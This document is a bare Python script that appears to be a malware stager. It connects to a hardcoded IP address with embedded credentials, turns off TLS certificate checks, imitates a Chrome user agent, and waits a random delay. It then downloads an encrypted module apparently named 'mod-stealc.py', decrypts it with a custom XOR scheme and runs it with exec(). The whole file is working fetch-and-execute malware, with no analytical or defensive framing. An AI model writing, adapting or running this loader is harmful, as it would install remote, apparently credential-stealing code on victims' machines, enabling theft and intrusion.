import urllib.request, base64, ssl, hashlib, time, random

_h = '149.255.35.152'
_p = '8443'
_u = 'op'
_w = 'Kx9mQ2vL7pR4nZ8w'
_m = 'mod-stealc.py'
_ep = '/api/v1/r/'
_tls = True

_ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'

_S = b'\x73\x6f\x64\x69\x75\x6d\x63\x68\x6c\x6f\x72\x69\x64\x65'


def _dk(pw):
    return hashlib.pbkdf2_hmac('sha256', pw.encode(), _S, 4096, 32)


def _cx(data, key):
    out = bytearray(len(data))
    i = 0
    n = 0
    while i < len(data):
        blk = hashlib.sha256(key + n.to_bytes(8, 'little')).digest()
        end = min(i + 32, len(data))
        for j in range(end - i):
            out[i + j] = data[i + j] ^ blk[j]
        i = end
        n += 1
    return bytes(out)


def _fetch(name):
    key = _dk(_w)
    enc_name = base64.b64encode(_cx(name.encode(), key)).decode()
    scheme = 'https' if _tls else 'http'
    url = scheme + '://' + _h + ':' + _p + _ep + enc_name
    req = urllib.request.Request(url, headers={
        'User-Agent': _ua,
        'Accept': 'text/html,application/xhtml+xml',
    })
    auth = base64.b64encode(('%s:%s' % (_u, _w)).encode()).decode()
    req.add_header('Authorization', 'Basic ' + auth)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    resp = urllib.request.urlopen(req, context=ctx, timeout=30)
    return _cx(resp.read(), key)


time.sleep(random.uniform(1.0, 4.0))

_code = _fetch(_m).decode('utf-8')
_ns = dict(globals())
exec(compile(_code, '<i>', 'exec'), _ns)
